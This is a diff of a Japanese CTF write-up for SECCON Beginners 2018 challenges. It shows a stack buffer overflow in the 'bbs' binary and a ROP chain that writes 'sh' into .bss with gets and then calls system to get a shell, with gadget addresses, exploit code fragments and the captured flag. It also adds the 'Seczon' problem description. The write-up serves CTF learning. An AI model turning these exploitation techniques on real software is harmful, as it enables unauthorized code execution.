@@ -87,7 +87,7 @@ RELRO           STACK CANARY      NX            PIE             RPATH      RUNPA
 Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No	0		4	bbs
 ```
 
-このバイナリでもgetsを使っておりスタック・バッファオーバーフローが起きる。144バイト入力したところでcoreを見てみると、ripが4006f9のret命令実行直前でrspに`0x4141414141414141`がある。つまりreturn addressまで136バイトのオフセットであることが分かる。
+このバイナリでもgetsを使っておりスタック・バッファオーバーフローが起きる。144バイト入力したところでcoreを見てみると、4006f9のret命令実行直前でrspに`0x4141414141414141`がある。つまりreturn addressまで136バイトのオフセットであることが分かる。
 ```
 $ python -c 'print "A"*144'|./bbs 
 Input Content : 
@@ -115,7 +115,7 @@ gef➤  x/10xg $rsp
 gef➤  
 ```
 
-あとはROPをおこなっていく。pltセクションに`system`があるので、`system("sh")`を実行するROPチェーンを。すなわち、`sh`の文字列があるアドレスがバイナリにあれば、それをrdiにセットして`system`を呼べばシェルを獲れる。ただgdbで見た感じバイナリには`sh`文字列はなかった。
+あとはROPをおこなっていく。pltセクションに`system`があるので、`system("sh")`を実行するROPチェーンを作る。すなわち、`sh`の文字列があるアドレスがメモリー上の静的な場所にあれば、それをrdiにセットして`system`を呼べばシェルを獲れる。ただgdbで見た感じバイナリには`sh`文字列はなかった。
 ```
 $ gdb -q bbs
 gef➤  start
@@ -125,10 +125,10 @@ gef➤  grep sh
   0x7ffff7a1e91c - 0x7ffff7a1e921  →   "shell" 
 ```
 
-よって、まず`gets`で`sh`文字列をbssセクションに書いて、その後`system`をcallするようなROPチェーンにすればよい。
+PIEが無効な環境ではbssセクションは静的でかつ書き込み可能なため、このbssセクションを利用する。`gets`で`sh`文字列をbssセクションに書いて、その後`system`をcallするようなROPチェーンにすればよい。
 ROPに必要な`pop rdi`ガジェット、bssセクションのアドレス、`gets`と`system`のアドレスを求めておく。
 
-* ``pop rdiガジェット
+* `pop rdi`ガジェット
 ```
 $ rp-lin-x64 -r 3 --file bbs |grep "pop rdi"
 0x00400763: pop rdi ; ret  ;  (1 found)
@@ -148,12 +148,13 @@ $ objdump -M intel -d bbs |grep gets
   4004f8:	e8 83 00 00 00       	call   400580 <gets@plt+0x10>
 0000000000400570 <gets@plt>:
   4006c4:	e8 a7 fe ff ff       	call   400570 <gets@plt>
-kanken@kanken-VirtualBox:~/ctf/secoon_be_2018/bbs$ objdump -M intel -d bbs |grep system
+
+$ objdump -M intel -d bbs |grep system
 0000000000400540 <system@plt>:
   4006d8:	e8 63 fe ff ff       	call   400540 <system@plt>
 ```
 
-ROPチェーンを下記のようにしておく。
+ROPチェーンを下記のようにしておけばよい。
 ```
     system = 0x0000000000400540
     gets = 0x0000000000400570
@@ -168,9 +169,10 @@ ROPチェーンを下記のようにしておく。
     buf += p(bss)
     buf += p(system)
     f.write(buf+"\n")
-    f.write("sh\0\n")
+    f.write("sh\0\n") <--- getsによるbssセクションへのsh文字列書き込み
 ```
 
+[exp_bbs.py](https://github.com/kank3n/writeups/blob/master/seccon_b2018/exp_bbs.py)
 ```
 $ python exp_bbs.py -r
 Input Content : 
@@ -191,6 +193,25 @@ ctf4b{Pr3p4r3_4rgum3n75_w17h_ROP_4nd_c4ll_4rb17r4ry_func710n5}
 
 ***
 # Seczon 388 point
+
+## Question
+```
+オンラインショッピング機能の模型を作成しました。脆弱性がないか検査してみてください。
+
+Host: pwn1.chall.beginners.seccon.jp
+Port: 21735
+```
+
+バイナリ・ファイルとlibcも与えられる。
+
+## Solution
+
+バイナリは32bit。checksecを見たところセキュリティーは厳しい。Full RELROなのでGOT Overwriteは出来ないし、PIEも有効なのでtextセクションもrandomaizeされる。
+```
+$ checksec --file seczon 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE
+Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   Yes	0		6	seczon
+```
 
 ```
 $ python exp_seczon.py -r
